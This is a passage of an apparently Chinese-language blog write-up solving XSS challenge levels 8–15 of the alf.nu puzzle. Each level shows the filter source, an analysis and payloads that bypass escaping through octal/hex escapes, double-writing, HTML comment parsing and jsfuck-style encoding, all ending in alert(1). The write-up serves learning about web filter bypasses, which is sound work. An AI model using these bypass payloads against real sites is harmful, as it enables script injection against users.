class="hljs-title">htmlEscape</span>(<span class="hljs-params">s</span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> s.replace(<span class="hljs-regexp">/./g</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">x</span>) </span>&#123;<br>            <span class="hljs-keyword">return</span> &#123;<br>                <span class="hljs-string">&#x27;&lt;&#x27;</span>: <span class="hljs-string">&#x27;&amp;lt;&#x27;</span>,<br>                <span class="hljs-string">&#x27;&gt;&#x27;</span>: <span class="hljs-string">&#x27;&amp;gt;&#x27;</span>,<br>                <span class="hljs-string">&#x27;&amp;&#x27;</span>: <span class="hljs-string">&#x27;&amp;amp;&#x27;</span>,<br>                <span class="hljs-string">&#x27;&quot;&#x27;</span>: <span class="hljs-string">&#x27;&amp;quot;&#x27;</span>,<br>                <span class="hljs-string">&quot;&#x27;&quot;</span>: <span class="hljs-string">&#x27;&amp;#39;&#x27;</span><br>            &#125;[x] || x;<br>        &#125;);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">expandTemplate</span>(<span class="hljs-params">template, args</span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> template.replace(<br>            /&#123;(\w+)&#125;/g,<br>            <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">_, n</span>) </span>&#123;<br>                <span class="hljs-keyword">return</span> htmlEscape(args[n]);<br>            &#125;);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> expandTemplate(<br>        <span class="hljs-string">&quot;                                                \n\</span><br><span class="hljs-string">      &lt;h2&gt;Hello, &lt;span id=name&gt;&lt;/span&gt;!&lt;/h2&gt;         \n\</span><br><span class="hljs-string">      &lt;script&gt;                                       \n\</span><br><span class="hljs-string">         var v = document.getElementById(&#x27;name&#x27;);    \n\</span><br><span class="hljs-string">         v.innerHTML = &#x27;&lt;a href=#&gt;&#123;name&#125;&lt;/a&gt;&#x27;;       \n\</span><br><span class="hljs-string">      &lt;\/script&gt;                                     \n\</span><br><span class="hljs-string">    &quot;</span>, &#123;<br>            name: s<br>        &#125;<br>    );<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="8-2-分析"><a href="#8-2-分析" class="headerlink" title="8.2 分析"></a>8.2 分析</h3><p>代码对输入的<code>&lt;</code>、<code>&gt;</code>、<code>&amp;</code>、<code>&quot;</code>、<code>&#39;</code>、进行了转义，输入的字符串会拼接在<code>&#123;name&#125;</code>处。<br>由于没有过滤<code>\</code>，可以利用<code>JS</code>的8进制或者16进制编码来绕过。</p><h3 id="8-3-Payload"><a href="#8-3-Payload" class="headerlink" title="8.3 Payload"></a>8.3 Payload</h3><p>需要注意的是第二个<code>Payload</code>末尾有一个空格。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-number">32</span>个字符<br>\x3cimg src onerror=alert(<span class="hljs-number">1</span>)\x3e<br><span class="hljs-number">26</span>个字符<br>\x3cstyle/onload=alert(<span class="hljs-number">1</span>) <br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/xss-alf.nu/20190606102148.png"></p><h2 id="9-JSON-2"><a href="#9-JSON-2" class="headerlink" title="9. JSON 2"></a>9. JSON 2</h2><h3 id="9-1-源码"><a href="#9-1-源码" class="headerlink" title="9.1 源码"></a>9.1 源码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">s</span>) </span>&#123;<br>    s = <span class="hljs-built_in">JSON</span>.stringify(s).replace(<span class="hljs-regexp">/&lt;\/script/gi</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;script&gt;console.log(&#x27;</span> + s + <span class="hljs-string">&#x27;);&lt;/script&gt;&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="9-2-分析"><a href="#9-2-分析" class="headerlink" title="9.2 分析"></a>9.2 分析</h3><p>对<code>&lt;/script&gt;</code>标签进行了过滤，由于正则中存在<code>i</code>修饰符，不区分大小写，不能使用大小写混合来绕过。</p><p>由于直接将字符串替换为空，可以双写绕过。</p><h3 id="9-3-Payload"><a href="#9-3-Payload" class="headerlink" title="9.3 Payload"></a>9.3 Payload</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;<span class="hljs-regexp">/&lt;/</span>scriptscript&gt;&lt;script&gt;alert(<span class="hljs-number">1</span>)<span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/xss-alf.nu/20190606102708.png"></p><h2 id="10-Callback-2"><a href="#10-Callback-2" class="headerlink" title="10. Callback 2"></a>10. Callback 2</h2><h3 id="10-1-源码"><a href="#10-1-源码" class="headerlink" title="10.1 源码"></a>10.1 源码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">s</span>) </span>&#123;<br>    <span class="hljs-comment">// Pass inn &quot;callback#userdata&quot;</span><br>    <span class="hljs-keyword">var</span> thing = s.split(<span class="hljs-regexp">/#/</span>);<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-regexp">/^[a-zA-Z\[\]&#x27;]*$/</span>.test(thing[<span class="hljs-number">0</span>])) <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Invalid callback&#x27;</span>;<br>    <span class="hljs-keyword">var</span> obj = &#123;<br>        <span class="hljs-string">&#x27;userdata&#x27;</span>: thing[<span class="hljs-number">1</span>]<br>    &#125;;<br>    <span class="hljs-keyword">var</span> json = <span class="hljs-built_in">JSON</span>.stringify(obj).replace(<span class="hljs-regexp">/\//g</span>, <span class="hljs-string">&#x27;\\/&#x27;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;script&gt;&quot;</span> + thing[<span class="hljs-number">0</span>] + <span class="hljs-string">&quot;(&quot;</span> + json + <span class="hljs-string">&quot;)&lt;/script&gt;&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="10-2-分析"><a href="#10-2-分析" class="headerlink" title="10.2 分析"></a>10.2 分析</h3><p>与第6题的类似，但是转义了<code>/</code>，导致<code>//</code>这个注释符无法使用，但是<code>JavaScript</code>的注释符有三种，分别是<code>//</code>、<code>/**/</code>、<code>&lt;!--</code>。<br>可以使用<code>&lt;!--</code>来注释。</p><h3 id="10-3-Payload"><a href="#10-3-Payload" class="headerlink" title="10.3 Payload"></a>10.3 Payload</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&#x27;#&#x27;</span>;alert(<span class="hljs-number">1</span>)&lt;!--<br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/xss-alf.nu/20190606103458.png"></p><h2 id="11-Skandia-2"><a href="#11-Skandia-2" class="headerlink" title="11. Skandia 2"></a>11. Skandia 2</h2><h3 id="11-1-源码"><a href="#11-1-源码" class="headerlink" title="11.1 源码"></a>11.1 源码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">s</span>) </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-regexp">/[&lt;&gt;]/</span>.test(s)) <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;-&#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;script&gt;console.log(&quot;&#x27;</span> + s.toUpperCase() + <span class="hljs-string">&#x27;&quot;)&lt;/script&gt;&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="11-2-分析"><a href="#11-2-分析" class="headerlink" title="11.2 分析"></a>11.2 分析</h3><p>代码过滤了<code>&lt;</code>、<code>&gt;</code>。还将所有输入的字母变成了大写，不能借助<code>toUpperCase()</code>的特性来解了。<br>可以利用<code>jsfuck</code>。<br>直接将<code>&quot;);alert(1)//</code>中的<code>alert(1)</code>用<code>jsfuck</code>表示。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.jsfuck.com/<br></code></pre></td></tr></table></figure><p>但是直接使用工具生成的<code>jsfuck</code>太长了，不过我们还有另一种方法，就是<code>JS</code>的匿名函数。</p><p><img src="https://image.mengsec.com/xss-alf.nu/20190609160959.png"></p><p>我们可以通过这种方法来执行任意方法。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">[][<span class="hljs-string">&#x27;map&#x27;</span>][<span class="hljs-string">&#x27;constructor&#x27;</span>](<span class="hljs-string">&#x27;alert(1)&#x27;</span>)()<br></code></pre></td></tr></table></figure><p>由于对字母进行了大写转换，我们可以将其进行8进制编码，然后闭合前面，注释后面。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&quot;);[][&#x27;\155\141\160&#x27;][&#x27;\143\157\156\163\164\162\165\143\164\157\162&#x27;](&#x27;\141\154\145\162\164(1)&#x27;)()//</span><br></code></pre></td></tr></table></figure><h3 id="11-3-Payload"><a href="#11-3-Payload" class="headerlink" title="11.3 Payload"></a>11.3 Payload</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript">方法一 <span class="hljs-number">1232</span>个字符<br><span class="hljs-string">&quotspan><br><span class="hljs-string">方法二 100个字符</span><br><span class="hljs-string">&quot;</span>);[][<span class="hljs-string">&#x27;\155\141\160&#x27;</span>][<span class="hljs-string">&#x27;\143\157\156\163\164\162\165\143\164\157\162&#x27;</span>](<span class="hljs-string">&#x27;\141\154\145\162\164(1)&#x27;</span>)()<span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/xss-alf.nu/20190609162353.png"></p><h2 id="12-iframe"><a href="#12-iframe" class="headerlink" title="12. iframe"></a>12. iframe</h2><h3 id="12-1-源码"><a href="#12-1-源码" class="headerlink" title="12.1 源码"></a>12.1 源码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">s</span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> tag = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&#x27;iframe&#x27;</span>);<br><br>    <span class="hljs-comment">// For this one, you get to run any code you want, but in a &quot;sandboxed&quot; iframe.</span><br>    <span class="hljs-comment">// https://4i.am/?...raw=... just outputs whatever you pass in.</span><br>    <span class="hljs-comment">// Alerting from 4i.am won&#x27;t count.</span><br>    s = <span class="hljs-string">&#x27;&lt;script&gt;&#x27;</span> + s + <span class="hljs-string">&#x27;&lt;\/script&gt;&#x27;</span>;<br>    tag.src = <span class="hljs-string">&#x27;https://4i.am/?:XSS=0&amp;CT=text/html&amp;raw=&#x27;</span> + <span class="hljs-built_in">encodeURIComponent</span>(s);<br><br>    <span class="hljs-built_in">window</span>.WINNING = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>        youWon = <span class="hljs-literal">true</span>;<br>    &#125;;<br><br>    tag.setAttribute(<span class="hljs-string">&#x27;onload&#x27;</span>, <span class="hljs-string">&#x27;youWon &amp;&amp; alert(1)&#x27;</span>);<br>    <span class="hljs-keyword">return</span> tag.outerHTML;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="12-2-分析"><a href="#12-2-分析" class="headerlink" title="12.2 分析"></a>12.2 分析</h3><p>代码逻辑很简单，只要使<code>youWon</code>为<code>true</code>，这样就能执行<code>alert(1)</code>了。<br>解决思路是利用到<code>iframe</code>的特性，当在<code>iframe</code>中设置了一个<code>name</code>属性之后， 这个<code>name</code>属性的值就会变成<code>iframe</code>中的<code>window</code>对象的全局。</p><h3 id="12-3-Payload"><a href="#12-3-Payload" class="headerlink" title="12.3 Payload"></a>12.3 Payload</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">name=<span class="hljs-string">&quot;youWon&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/xss-alf.nu/20190609163222.png"></p><h2 id="13-TI-S-M"><a href="#13-TI-S-M" class="headerlink" title="13. TI(S)M"></a>13. TI(S)M</h2><h3 id="13-1-源码"><a href="#13-1-源码" class="headerlink" title="13.1 源码"></a>13.1 源码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">s</span>) </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">json</span>(<span class="hljs-params">s</span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">JSON</span>.stringify(s).replace(<span class="hljs-regexp">/\//g</span>, <span class="hljs-string">&#x27;\\/&#x27;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">html</span>(<span class="hljs-params">s</span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> s.replace(<span class="hljs-regexp">/[&lt;&gt;&quot;&amp;]/g</span>,<br>        <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">s</span>) </span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&amp;#&#x27;</span> + s.charCodeAt(<span class="hljs-number">0</span>) + <span class="hljs-string">&#x27;;&#x27;</span>;<br>        &#125;);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> (<span class="hljs-string">&#x27;&lt;script&gt;&#x27;</span> + <span class="hljs-string">&#x27;var url = &#x27;</span> + json(s) + <span class="hljs-string">&#x27;; // We\&#x27;ll use this later &#x27;</span> + <span class="hljs-string">&#x27;&lt;/script&gt;\n\n&#x27;</span> + <span class="hljs-string">&#x27;  &lt;!-- for debugging --&gt;\n&#x27;</span> + <span class="hljs-string">&#x27;  URL: &#x27;</span> + html(s) + <span class="hljs-string">&#x27;\n\n&#x27;</span> + <span class="hljs-string">&#x27;&lt;!-- then suddenly --&gt;\n&#x27;</span> + <span class="hljs-string">&#x27;&lt;script&gt;\n&#x27;</span> + <span class="hljs-string">&#x27;  if (!/^http:.*/.test(url)) console.log(&quot;Bad url: &quot; + url);\n&#x27;</span> + <span class="hljs-string">&#x27;  else new Image().src = url;\n&#x27;</span> + <span class="hljs-string">&#x27;&lt;/script&gt;&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="13-2-分析"><a href="#13-2-分析" class="headerlink" title="13.2 分析"></a>13.2 分析</h3><p>本题用到了一个小<code>trick</code>:<br><code>HTML5</code>解析器会将<code>&lt;!--&lt;script&gt;</code>到<code>&lt;/script&gt;</code>之间的任何东西都当作<code>JavaScript</code>代码处理，同时要确保代码中还有一个<code>--&gt;</code>来防止解析器报语法错误。</p><p>首先输入一个<code>&lt;!--&lt;script&gt;</code>，此时的输出中</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;!--<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>&quot;; // We&#x27;ll use this later <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><br>  &lt;!-- <span class="hljs-keyword">for</span> debugging --&gt;<br>  URL: &amp;#60;!--&amp;#60;script&amp;#62;<br><br>&lt;!-- then suddenly --&gt;<br>&lt;script&gt;<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-regexp">/^http:.*/</span>.test(url)) <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;Bad url: &quot;</span> + url);<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">new</span> Image().src = url;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>这一段所有的代码都会当做<code>JS</code>执行。<br>在后面有个正则表达式<code>!/^http:.*/</code>，其中的<code>*/</code>可以当做注释，那么我们在前面再加入一个<code>/*</code>即可闭合。<br>此时的输出为</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<span class="hljs-keyword">var</span> url = <span class="hljs-string">&quot;\/*&lt;!--&lt;script&gt;&quot;</span>; <span class="hljs-comment">// We&#x27;ll use this later &lt;/script&gt;</span><br><br>  &lt;!-- <span class="hljs-keyword">for</span> debugging --&gt;<br>  URL: <span class="hljs-comment">/*&amp;#60;!--&amp;#60;script&amp;#62;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">&lt;!-- then suddenly --&gt;</span><br><span class="hljs-comment">&lt;script&gt;</span><br><span class="hljs-comment">  if (!/^http:.*/</span>.test(url)) <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;Bad url: &quot;</span> + url);<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">new</span> Image().src = url;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>那么，在注释符之前添加要执行的代码就可以了。</p><h3 id="13-3-Payload"><a href="#13-3-Payload" class="headerlink" title="13.3 Payload"></a>13.3 Payload</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">if</span>(alert(<span class="hljs-number">1</span>)<span class="hljs-comment">/*&lt;!--&lt;script&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/xss-alf.nu/20190606192201.png"></p><h2 id="14-JSON-3"><a href="#14-JSON-3" class="headerlink" title="14. JSON 3"></a>14. JSON 3</h2><h3 id="14-1-源码"><a href="#14-1-源码" class="headerlink" title="14.1 源码"></a>14.1 源码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">s</span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> s.split(<span class="hljs-string">&#x27;#&#x27;</span>).map(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">v</span>) </span>&#123;<br>        <span class="hljs-comment">// Only 20% of slashes are end tags; save 1.2% of total</span><br>        <span class="hljs-comment">// bytes by only escaping those.</span><br>        <span class="hljs-keyword">var</span> json = <span class="hljs-built_in">JSON</span>.stringify(v).replace(<span class="hljs-regexp">/&lt;\//g</span>, <span class="hljs-string">&#x27;&lt;\\/&#x27;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;script&gt;console.log(&#x27;</span> + json + <span class="hljs-string">&#x27;)&lt;/script&gt;&#x27;</span>;<br>    &#125;).join(<span class="hljs-string">&#x27;&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="14-2-分析"><a href="#14-2-分析" class="headerlink" title="14.2 分析"></a>14.2 分析</h3><p>题目思路与上一个题类似，借助<code>&lt;!--&lt;script&gt;</code>来执行JS代码，不过因为后面没有<code>--&gt;</code>，解析器会报错，需要我们在后面构造一个<code>--&gt;</code>来避免报错。</p><p>构造的<code>Payload</code>为<code>&lt;!--&lt;script&gt;#)/;alert(1)//--&gt;</code>，此时输出为</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;&lt;!--&lt;script&gt;&quot;</span>)&lt;<span class="hljs-regexp">/script&gt;&lt;script&gt;console.log(&quot;)/</span>;alert(<span class="hljs-number">1</span>)<span class="hljs-comment">//--&gt;&quot;)&lt;/script&gt;</span><br></code></pre></td></tr></table></figure><p>其中<code>/script&gt;&lt;script&gt;console.log(&quot;)/</code>被当做了正则表达式解析，后面通过分号分割后，成功执行代码<code>alert(1)</code>。</p><h3 id="14-3-Payload"><a href="#14-3-Payload" class="headerlink" title="14.3 Payload"></a>14.3 Payload</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;!--&lt;script&gt;#)/;alert(1)//--&gt;<br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/xss-alf.nu/20190606193722.png"></p><h2 id="15-Skandia-3"><a href="#15-Skandia-3" class="headerlink" title="15. Skandia 3"></a>15. Skandia 3</h2><h3 id="15-1-源码"><a href="#15-1-源码" class="headerlink" title="15.1 源码"></a>15.1 源码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">s</span>) </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-regexp">/[\\&lt;&gt;]/</span>.test(s)) <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;-&#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;script&gt;console.log(&quot;&#x27;</span> + s.toUpperCase() + <span class="hljs-string">&#x27;&quot;)&lt;/script&gt;&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="15-2-分析"><a href="#15-2-分析" class="headerlink" title="15.2 分析"></a>15.2 分析</h3><p>代码过滤了<code>\</code>、<code>&lt;</code>、<code>&gt;</code>、同样使用<code>jsfuck</code>就能过。因为对<code>\</code>进行了过滤，不能使用八进制编码来绕过了。<br>根据<code>jsfuck</code>的<a href="https://zh.wikipedia.org/wiki/JSFuck">原理</a>，我们借助匿名函数来构造一个更短的<code>Payload</code>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">[][<span class="hljs-string">&quot;sort&quot;</span>][<span class="hljs-string">&quot;constructor&quot;</span>](<span class="hljs-string">&#x27;alert(1)&#x27;</span>)()<br></code></pre></td></tr></table></figure><p>接下来的目标是将其中的字母以其他形式来表示。</p><ul><li>用 <code>!</code> 开头会转换成 <code>Boolean 布尔值</code></li><li>用 <code>+</code> 开头会转换成 <code>Number 数值类型</code></li><li>添加 <code>[]</code> 会转换成 <code>String 字符串</code></li><li><code>![] === false</code> 、 <code>+[] === 0</code> 、 <code>[]+[] === &quot;&quot;</code></li></ul><table><thead><tr><th>值</th><th>经过jsfuck转换后</th></tr></thead><tbody><tr><td>false</td><td><code>![]</code></td></tr><tr><td>true</td><td><code>!![]</code>或<code>!+[]</code></td></tr><tr><td>NaN</td><td><code>+[![]]</code>或<code>+[][[]]</code></td></tr><tr><td>undefined</td><td><code>[][[]]</code></td></tr><tr><td>Infinity</td><td><code>+(+!+[]+(!+[]+[])[!+[]+!+[]+!+[]]+[+!+[]]+[+[]]+[+[]]+[+[]])</code></td></tr></tbody></table><p>由此我们需要获得<code>construale</code>这些字符的特殊表示。很明显，上述表格内的字母是不够的，需要继续构造。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">(![]+[])[<span class="hljs-number">0</span>]+([][[]]+[])[<span class="hljs-number">5</span>]+(![]+[])[<span class="hljs-number">2</span>]+(![]+[])[<span class="hljs-number">2</span>] === <span class="hljs-string">&quot;fill&quot;</span><br>[][<span class="hljs-string">&#x27;fill&#x27;</span>]+[] === [][(![]+[])[<span class="hljs-number">0</span>]+([][[]]+[])[<span class="hljs-number">5</span>]+(![]+[])[<span class="hljs-number">2</span>]+(![]+[])[<span class="hljs-number">2</span>]]+[] ===<span class="hljs-string">&quot;function fill() &#123; [native code] &#125;&quot;</span><br></code></pre></td></tr></table></figure><p>可得</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&quot;c&quot;</span> === ([][(![]+[])[<span class="hljs-number">0</span>]+([][[]]+[])[<span class="hljs-number">5</span>]+(![]+[])[<span class="hljs-number">2</span>]+(![]+[])[<span class="hljs-number">2</span>]]+[])[<span class="hljs-number">3</span>]<br><span class="hljs-string">&quot;o&quot;</span> === ([][(![]+[])[<span class="hljs-number">0</span>]+([][[]]+[])[<span class="hljs-number">5</span>]+(![]+[])[<span class="hljs-number">2</span>]+(![]+[])[<span class="hljs-number">2</span>]]+[])[<span class="hljs-number">6</span>]<br><span class="hljs-string">&quot;n&quot;</span> === ([][[]]+[])[<span class="hljs-number">1</span>]<br><span class="hljs-string">&quot;s&quot;</span> === (![]+[])[<span class="hljs-number">3</span>]<br><span class="hljs-string">&quot;t&quot;</span> === (!![]+[])[<span class="hljs-number">0</span>]<br><span class="hljs-string">&quot;r&quot;</span> === (!![]+[])[<span class="hljs-number">1</span>]<br><span class="hljs-string">&quot;u&quot;</span> === (!![]+[])[<span class="hljs-number">2</span>]<br><span class="hljs-string">&quot;a&quot;</span> === (![]+[])[<span class="hljs-number">1</span>]<br><span class="hljs-string">&quot;l&quot;</span> === (![]+[])[<span class="hljs-number">2</span>]<br><span class="hljs-string">&quot;e&quot;</span> === (![]+[])[<span class="hljs-number">4</span>]<br></code></pre></td></tr></table></figure><p>可得</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&quot;sort&quot;</span> === (![]+[])[<span class="hljs-number">3</span>]+([][(![]+[])[<span class="hljs-number">0</span>]+([][[]]+[])[<span class="hljs-number">5</span>]+(![]+[])[<span class="hljs-number">2</span>]+(![]+[])[<span class="hljs-number">2</span>]]+[])[<span class="hljs-number">6</span>]+(!![]+[])[<span class="hljs-number">1</span>]+(!![]+[])[<span class="hljs-number">0</span>]<br><span class="hljs-string">&quot;constructor&quot;</span> === ([][(![]+[])[<span class="hljs-number">0</span>]+([][[]]+[])[<span class="hljs-number">5</span>]+(![]+[])[<span class="hljs-number">2</span>]+(![]+[])[<span class="hljs-number">2</span>]]+[])[<span class="hljs-number">3</span>]+([][(![]+[])[<span class="hljs-number">0</span>]+([][[]]+[])[<span class="hljs-number">5</span>]+(![]+[])[<span class="hljs-number">2</span>]+(![]+[])[<span class="hljs-number">2</span>]]+[])[<span class="hljs-number">6</span>]+([][[]]+[])[<span class="hljs-number">1</span>]+(![]+[])[<span class="hljs-number">3</span>]+(!![]+[])[<span class="hljs-number">0</span>]+(!![]+[])[<span class="hljs-number">1</span>]+(!![]+[])[<span class="hljs-number">2</span>]+([][(![]+[])[<span class="hljs-number">0</span>]+([][[]]+[])[<span class="hljs-number">5</span>]+(![]+[])[<span class="hljs-number">2</span>]+(![]+[])[<span class="hljs-number">2</span>]]+[])[<span class="hljs-number">3</span>]+(!![]+[])[<span class="hljs-number">0</span>]+([][(![]+[])[<span class="hljs-number">0</span>]+([][[]]+[])[<span class="hljs-number">5</span>]+(![]+[])[<span 